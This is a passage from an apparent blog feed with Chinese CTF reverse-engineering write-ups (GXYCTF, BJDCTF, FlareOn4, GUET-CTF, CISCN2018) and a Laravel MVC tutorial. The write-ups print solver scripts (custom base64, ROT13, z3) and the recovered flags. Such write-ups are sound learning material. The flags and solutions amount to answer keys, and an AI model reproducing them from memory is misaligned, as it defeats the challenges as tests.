class="string">&quot;&quot;</span>.join(flag)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(flag.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">print(md5.hexdigest())</span><br></pre></td></tr></table></figure><h2 id="2-CISCN2018-2ex"><a href="#2-CISCN2018-2ex" class="headerlink" title="2.[CISCN2018]2ex"></a>2.[CISCN2018]2ex</h2><p>发现是个静态编译的mips文件，里面还有一份output.txt文件<br>放到ubuntu20.04里，下个qemu-user来跑一下，输入之后就退出了</p><p>分析一下，可以找到一个算法，根据特征识别为base64换表<br><img src="https://i.loli.net/2021/04/19/wuPQMxYlh8jFnHc.png" alt=""></p><p><img src="https://i.loli.net/2021/04/19/FhNgIU9PVHDLe42.png" alt=""></p><p>这里还有padding<br><img src="https://i.loli.net/2021/04/19/JraqnKhvDINU9Zk.png" alt=""></p><p>base64 换表解密即可</p><p>decode.py:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">table = <span class="string">&quot;@,.1fgvw#`/2ehux$~\&quot;3dity%_;4cjsz^+&#123;5bkrA&amp;=&#125;6alqB*-[70mpC()]89noD&quot;</span></span><br><span class="line">old_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">flag1 = <span class="string">&quot;|_r-+_Cl5;vgq_pdme7#7eC0=&quot;</span></span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(flag1.translate(<span class="built_in">str</span>.maketrans(table,old_table)))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel框架学习</title>
      <link href="2021/04/14/Laravel-study/"/>
      <url>2021/04/14/Laravel-study/</url>
      
        <content type="html"><![CDATA[<h2 id="了解框架的MVC模型"><a href="#了解框架的MVC模型" class="headerlink" title="了解框架的MVC模型"></a>了解框架的MVC模型</h2><ul><li>使用框架来实现一个通过url访问用户邮箱的小功能来了解路由，模型和视图的写法</li></ul><p>首先在数据库中插入两条数据<br><img src="https://i.loli.net/2021/04/14/E3uoIHbUyxszrYO.png" alt=""></p><p>使用php artisan生成模型<br><img src="https://i.loli.net/2021/04/14/xiutPL4GvrRQ5nc.png" alt=""></p><p>通过文档得知命名规范如下</p><blockquote><p>数据表名称<br>请注意，我们并没有告诉 Eloquent 我们的 Flight 模型使用哪个数据表。 除非明确地指定了其它名称，否则将使用类的复数形式「蛇形命名」来作为表名。因此，在这种情况下，Eloquent 将假设 Flight 模型存储的是 flights 数据表中的数据，而 AirTrafficController 模型会将记录存储在 air_traffic_controllers 表中。<br>你可以通过在模型上定义 table 属性来指定自定义数据表：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flight</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 与模型关联的表名</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$table</span> = <span class="string">&#x27;my_flights&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><p>所以我们使用的数据表为usertests,模型为Usertest</p><blockquote><p>默认情况下，Eloquent 预期你的数据表中存在 created_at 和 updated_at 两个字段 。如果你不想让 Eloquent 自动管理这两个列， 请将模型中的 $timestamps 属性设置为 false：</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flight</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 是否主动维护时间戳</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$timestamps</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Usertest-php模型代码"><a href="#Usertest-php模型代码" class="headerlink" title="Usertest.php模型代码"></a>Usertest.php模型代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Factories</span>\<span class="title">HasFactory</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Usertest</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">HasFactory</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$timestamps</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PostTestController-php控制器代码"><a href="#PostTestController-php控制器代码" class="headerlink" title="PostTestController.php控制器代码"></a>PostTestController.php控制器代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">laravel_study_user</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">Usertest</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PostTestController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$user</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$dbuser</span> = Usertest::query() -&gt; where(<span class="string">&quot;username&quot;</span>,<span class="variable">$user</span>) -&gt; firstOrFail();</span><br><span class="line">        <span class="comment">// dd调试php程序</span></span><br><span class="line">        <span class="comment">//        dd($dbuser);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 修改了alex用户的email</span></span><br><span class="line">        <span class="comment">//        $dbuser-&gt;email = &quot;alex.com&quot;;</span></span><br><span class="line">        <span class="comment">//        $dbuser-&gt;save();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// return视图</span></span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">&quot;posttest&quot;</span>,[<span class="string">&quot;user&quot;</span>=&gt;<span class="variable">$user</span>,<span class="string">&quot;email&quot;</span>=&gt;<span class="variable">$dbuser</span>-&gt;email]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="web-php路由代码"><a href="#web-php路由代码" class="headerlink" title="web.php路由代码"></a>web.php路由代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Facades</span>\<span class="title">Route</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Web Routes</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| Here is where you can register web routes for your application. These</span></span><br><span class="line"><span class="comment">| routes are loaded by the RouteServiceProvider within a group which</span></span><br><span class="line"><span class="comment">| contains the &quot;web&quot; middleware group. Now create something great!</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">&#x27;welcome&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">&#x27;posttest/&#123;user&#125;&#x27;</span>,[\App\Http\Controllers\PostTestController::class,<span class="string">&quot;show&quot;</span>]);</span><br></pre></td></tr></table></figure><h3 id="posttest-blade-php视图代码"><a href="#posttest-blade-php视图代码" class="headerlink" title="posttest.blade.php视图代码"></a>posttest.blade.php视图代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;hello laravel&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt; &#123;&#123; <span class="variable">$user</span> &#125;&#125;&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123; <span class="variable">$email</span> &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="https://i.loli.net/2021/04/14/yceTw72BnEvJ3QU.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> laravel </tag>
            
            <tag> php </tag>
            
            <tag> 开发学习 </tag>
            
            <tag> 开发框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf reverse题解1</title>
      <link href="2021/04/07/buuctf-reverse/"/>
      <url>2021/04/07/buuctf-reverse/</url>
      
        <content type="html"><![CDATA[<h2 id="1-GXYCTF2019-luck-guy"><a href="#1-GXYCTF2019-luck-guy" class="headerlink" title="1.[GXYCTF2019]luck_guy"></a>1.[GXYCTF2019]luck_guy</h2><p>elf文件，64位，目测是输入什么lucky number<br><img src="https://i.loli.net/2021/04/07/Fjytlk8xvTOhY3f.png" alt=""></p><p>不管他，直接ida f5大法<br>主要的函数就是getflag这个函数<br><img src="https://i.loli.net/2021/04/07/6VtlXNYGDeALmrq.png" alt=""><br>设置了随机数，然后switch，本地测试基本不可能走1-5分支<br>目测一下，比较合理的流程就是451<br>4为f2赋值<br>5改f2的值<br>1拼接f1和f2<br>其中f1在data段，有字符串数据，f2在bss未初始化全局变量段<br>然后就走这个流程，一开始脑子抽了，指针那个地方读错了然后就怎么也找不到<br>结合汇编来读，局部变量s其实不是一个long long类型的数据而是一个字符数组</p><p><img src="https://i.loli.net/2021/04/07/vPWqsT9XVmuxpJl.png" alt=""></p><p>然后本地写个脚本一运行就出来了<br>附上本地调试的py脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&quot;7F666F6067756369&quot;</span></span><br><span class="line"></span><br><span class="line">listFlag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">and</span> i != <span class="number">0</span>:</span><br><span class="line">        listFlag.append(flag[i-<span class="number">2</span>:i])</span><br><span class="line"></span><br><span class="line">listFlag.append(<span class="string">&#x27;69&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(listFlag)</span><br><span class="line">listFlag.reverse()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(listFlag)):</span><br><span class="line">    listFlag[i] = <span class="string">&#x27;0x&#x27;</span> + listFlag[i]</span><br><span class="line">    <span class="comment"># listFlag[i] = int(listFlag[i],16)</span></span><br><span class="line"><span class="comment"># print(listFlag)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(listFlag)):</span><br><span class="line">    listFlag[i] = <span class="built_in">int</span>(listFlag[i],base = <span class="number">16</span>)</span><br><span class="line">    print(listFlag)</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        listFlag[i] = listFlag[i] - <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        listFlag[i] = listFlag[i] - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(listFlag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(listFlag)):</span><br><span class="line">    listFlag[i] = <span class="built_in">chr</span>(listFlag[i])</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(listFlag))</span><br></pre></td></tr></table></figure><p>最后得到flag，但是是GXY前缀，换上ctf前缀交上才对<br><code>flag&#123;&#123;do_not_hate_me&#125;</code></p><h2 id="2-BJDCTF2020-JustRE"><a href="#2-BJDCTF2020-JustRE" class="headerlink" title="2.[BJDCTF2020]JustRE"></a>2.[BJDCTF2020]JustRE</h2><p>签到题</p><p>感觉像个win32的小程序<br><img src="https://i.loli.net/2021/04/08/uRZEXSd3ThVbU5q.png" alt=""></p><p>搜字符串大法<br><img src="https://i.loli.net/2021/04/08/7FwZ6BTmgpWUM5z.png" alt=""></p><p>发现格式化字符串<br><img src="https://i.loli.net/2021/04/08/Y6zUuAHxFZedtk9.png" alt=""></p><p>交上就对了555</p><h2 id="3-FlareOn4-login"><a href="#3-FlareOn4-login" class="headerlink" title="3.[FlareOn4]login"></a>3.[FlareOn4]login</h2><p>下载下来发现是html文件<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;prompt&quot;</span>).onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="built_in">document</span>.getElementById(<span class="string">&quot;flag&quot;</span>).value;</span><br><span class="line">    <span class="keyword">var</span> rotFlag = flag.replace(<span class="regexp">/[a-zA-Z]/g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode((c &lt;= <span class="string">&quot;Z&quot;</span> ? <span class="number">90</span> : <span class="number">122</span>) &gt;= (c = c.charCodeAt(<span class="number">0</span>) + <span class="number">13</span>)     ? c : c - <span class="number">26</span>);&#125;);</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span> == rotFlag) &#123;</span><br><span class="line">        alert(<span class="string">&quot;Correct flag!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        alert(<span class="string">&quot;Incorrect flag, rot again&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>发现一段js代码<br>分析发现核心逻辑主要是这一句，只要是字母就被正则匹配到，然后执行下面这个<br><code>String.fromCharCode((c &lt;= &quot;Z&quot; ? 90 : 122) &gt;= (c = c.charCodeAt(0) + 13)     ? c : c - 26);&#125;);</code><br>大概就是判断字符是否小于Z，如果是第一个括号的值就变成Z否则变成z(注意此时c的值没有发生改变)，然后第二个小括号是将c本身+13(注意此时c的值已经发生了改变)<br>再判断两个值的大小关系，如果前者大就不改变，如果后者大就-26(即相当于+13后-26，本质是原本的字符-13)<br>字母一共26个，如果本身变成z后大于本身+13，那么字母一定会小于n</p><p>有了这个逻辑写解密脚本就可以了，遍历加密后的字符串，如果当前字符属于a-m，那么+13，如果属于n-z，那么-13即可<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span></span><br><span class="line">flag = <span class="built_in">list</span>(flag)</span><br><span class="line"></span><br><span class="line">flaglist = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> (flag[i] &lt;= <span class="string">&#x27;Z&#x27;</span> <span class="keyword">and</span> flag[i] &gt;= <span class="string">&#x27;A&#x27;</span>) <span class="keyword">or</span> (flag[i] &gt;= <span class="string">&#x27;a&#x27;</span> <span class="keyword">and</span> flag[i] &lt;= <span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> (flag[i] &lt;= <span class="string">&#x27;M&#x27;</span> <span class="keyword">and</span> flag[i] &gt;= <span class="string">&#x27;A&#x27;</span>) <span class="keyword">or</span> (flag[i] &lt;= <span class="string">&#x27;m&#x27;</span> <span class="keyword">and</span> flag[i] &gt;= <span class="string">&#x27;a&#x27;</span>):</span><br><span class="line">            flag[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i]) + <span class="number">13</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i]) - <span class="number">13</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure></p><p><code>flag&#123;ClientSideLoginsAreEasy@flare-on.com&#125;</code></p><p>看了别的师傅的wp才发现这是一种加密为ROT13加密，学到了</p><blockquote><p>套用ROT13到一段文字上仅仅只需要检查字元字母顺序并取代它在13位之后的对应字母，有需要超过时则重新绕回26英文字母开 头即可。A换成N、B换成O、依此类推到M换成Z，然后序列反转：N换成A、O换成B、最后Z换成M。只有这些出现在英文字母里头的字元受影响；数字、符 号、空白字元以及所有其他字元都不变。因为只有在英文字母表里头只有26个，并且26=2×13，ROT13函数是它自己的逆反： [1] </p></blockquote><p>对任何字元x：ROT13(ROT13(x))=ROT26(x)=x。<br>直接找个在线解密工具梭出来也可以</p><h2 id="4-GUET-CTF2019-re"><a href="#4-GUET-CTF2019-re" class="headerlink" title="4.[GUET-CTF2019]re"></a>4.[GUET-CTF2019]re</h2><p>是个ELF文件，先checksec一下<br><img src="https://i.loli.net/2021/04/10/oJTznurCURtXE5N.png" alt=""><br>发现存在UPX壳<br>直接用工具脱壳<br><code>./upx -d ./re</code><br>然后进入ida分析，核心逻辑很简单，求出每一位flag然后转换成字符就可以，但是有坑点<br><img src="https://i.loli.net/2021/04/10/6rUJXYEoli1egf5.png" alt=""></p><p>一开始是想逐步求解的，但是发现这也太反人类了，直接用正则提取吧<br>脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">flag = [</span><br><span class="line"><span class="number">166163712</span>//<span class="number">1629056</span></span><br><span class="line">,<span class="number">731332800</span>//<span class="number">6771600</span></span><br><span class="line">,<span class="number">357245568</span>//<span class="number">3682944</span></span><br><span class="line">,<span class="number">1074393000</span>//<span class="number">10431000</span></span><br><span class="line">,<span class="number">489211344</span>//<span class="number">3977328</span></span><br><span class="line">,<span class="number">518971936</span>//<span class="number">5138336</span></span><br><span class="line">,<span class="number">406741500</span>//<span class="number">7532250</span></span><br><span class="line">,<span class="number">294236496</span>//<span class="number">5551632</span></span><br><span class="line">,<span class="number">177305856</span>//<span class="number">3409728</span></span><br><span class="line">,<span class="number">650683500</span>//<span class="number">13013670</span></span><br><span class="line">,<span class="number">298351053</span>//<span class="number">6088797</span></span><br><span class="line">,<span class="number">386348487</span>//<span class="number">7884663</span></span><br><span class="line">,<span class="number">438258597</span>//<span class="number">8944053</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">text = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  if ( 5198490 * flag[14] != 249527520 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 4544518 * flag[15] != 445362764 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 3645600 * flag[17] != 174988800 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 10115280 * flag[16] != 981182160 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 9667504 * flag[18] != 493042704 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 5364450 * flag[19] != 257493600 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 13464540 * flag[20] != 767478780 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 5488432 * flag[21] != 312840624 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 14479500 * flag[22] != 1404511500 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 6451830 * flag[23] != 316139670 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 6252576 * flag[24] != 619005024 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 7763364 * flag[25] != 372641472 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 7327320 * flag[26] != 373693320 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 8741520 * flag[27] != 498266640 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 8871876 * flag[28] != 452465676 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 4086720 * flag[29] != 208422720 )</span></span><br><span class="line"><span class="string">    return 0LL;</span></span><br><span class="line"><span class="string">  if ( 9374400 * flag[30] == 515592000 )</span></span><br><span class="line"><span class="string">    return 5759124 * flag[31] == 719890500;</span></span><br><span class="line"><span class="string">  return 0LL;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 匹配至少三次数字才有效</span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;\d&#123;3,&#125;&#x27;</span>)</span><br><span class="line">flagRe = pattern.findall(text)</span><br><span class="line">print(flagRe)</span><br><span class="line"></span><br><span class="line">smallList = []</span><br><span class="line">bigList = []</span><br><span class="line">flagAppend = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flagRe),<span class="number">2</span>):</span><br><span class="line">    smallList.append(<span class="built_in">int</span>(flagRe[i]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(flagRe),<span class="number">2</span>):</span><br><span class="line">    bigList.append(<span class="built_in">int</span>(flagRe[i]))</span><br><span class="line"></span><br><span class="line">print(<span class="built_in">len</span>(smallList))</span><br><span class="line">print(<span class="built_in">len</span>(bigList))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(smallList)):</span><br><span class="line">    flagAppend.append(bigList[i] // smallList[i])</span><br><span class="line"></span><br><span class="line">print(flagAppend)</span><br><span class="line"></span><br><span class="line">flag = flag + flagAppend</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = <span class="built_in">chr</span>(flag[i])</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join(flag))</span><br></pre></td></tr></table></figure><p>后来由于这俩坑点就怎么交也不对，搜了师傅们的wp才发现…<br>还有一种解法就是用z3约束器来解（学到了学到了</p><blockquote><p><a href="https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/">https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/</a></p></blockquote><p>用这种方法来解也比较方便，先解出来然后再转ascii码<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = Int(<span class="string">&quot;flag[&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(<span class="number">1629056</span> * flag[<span class="number">0</span>] == <span class="number">166163712</span>)</span><br><span class="line">s.add(<span class="number">6771600</span> * flag[<span class="number">1</span>] == <span class="number">731332800</span>)</span><br><span class="line">s.add(<span class="number">3682944</span> * flag[<span class="number">2</span>] == <span class="number">357245568</span>)</span><br><span class="line">s.add(<span class="number">10431000</span> * flag[<span class="number">3</span>] == <span class="number">1074393000</span>)</span><br><span class="line">s.add(<span class="number">3977328</span> * flag[<span class="number">4</span>] == <span class="number">489211344</span>)</span><br><span class="line">s.add(<span class="number">5138336</span> * flag[<span class="number">5</span>] == <span class="number">518971936</span>)</span><br><span class="line">s.add(<span class="number">7532250</span> * flag[<span class="number">7</span>] == <span class="number">406741500</span>)</span><br><span class="line">s.add(<span class="number">5551632</span> * flag[<span class="number">8</span>] == <span class="number">294236496</span>)</span><br><span class="line">s.add(<span class="number">3409728</span> * flag[<span class="number">9</span>] == <span class="number">177305856</span>)</span><br><span class="line">s.add(<span class="number">13013670</span> * flag[<span class="number">10</span>] == <span class="number">650683500</span>)</span><br><span class="line">s.add(<span class="number">6088797</span> * flag[<span class="number">11</span>] == <span class="number">298351053</span>)</span><br><span class="line">s.add(<span class="number">7884663</span> * flag[<span class="number">12</span>] == <span class="number">386348487</span>)</span><br><span class="line">s.add(<span class="number">8944053</span> * flag[<span class="number">13</span>] == <span class="number">438258597</span>)</span><br><span class="line">s.add(<span class="number">5198490</span> * flag[<span class="number">14</span>] == <span class="number">249527520</span>)</span><br><span class="line">s.add(<span class="number">4544518</span> * flag[<span class="number">15</span>] == <span class="number">445362764</span>)</span><br><span class="line">s.add(<span class="number">3645600</span> * flag[<span class="number">17</span>] == <span class="number">174988800</span>)</span><br><span class="line">s.add(<span class="number">10115280</span> * flag[<span class="number">16</span>] == <span class="number">981182160</span>)</span><br><span class="line">s.add(<span class="number">9667504</span> * flag[<span class="number">18</span>] == <span class="number">493042704</span>)</span><br><span class="line">s.add(<span class="number">5364450</span> * flag[<span class="number">19</span>] == <span class="number">257493600</span>)</span><br><span class="line">s.add(<span class="number">13464540</span> * flag[<span class="number">20</span>] == <span class="number">767478780</span>)</span><br><span class="line">s.add(<span class="number">5488432</span> * flag[<span class="number">21</span>] == <span class="number">312840624</span>)</span><br><span class="line">s.add(<span class="number">14479500</span> * flag[<span class="number">22</span>] == <span class="number">1404511500</span>)</span><br><span class="line">s.add(<span class="number">6451830</span> * flag[<span class="number">23</span>] == <span class="number">316139670</span>)</span><br><span class="line">s.add(<span class="number">6252576</span> * flag[<span class="number">24</span>] == <span class="number">619005024</span>)</span><br><span class="line">s.add(<span class="number">7763364</span> * flag[<span class="number">25</span>] == <span class="number">372641472</span>)</span><br><span class="line">s.add(<span class="number">7327320</span> * flag[<span class="number">26</span>] == <span class="number">373693320</span>)</span><br><span class="line">s.add(<span class="number">8741520</span> * flag[<span class="number">27</span>] == <span class="number">498266640</span>)</span><br><span class="line">s.add(<span class="number">8871876</span> * flag[<span class="number">28</span>] == <span class="number">452465676</span>)</span><br><span class="line">s.add(<span class="number">4086720</span> * flag[<span class="number">29</span>] == <span class="number">208422720</span>)</span><br><span class="line">s.add(<span class="number">9374400</span> * flag[<span class="number">30</span>] == <span class="number">515592000</span>)</span><br><span class="line">s.add(<span class="number">5759124</span> * flag[<span class="number">31</span>] == <span class="number">719890500</span>)</span><br><span 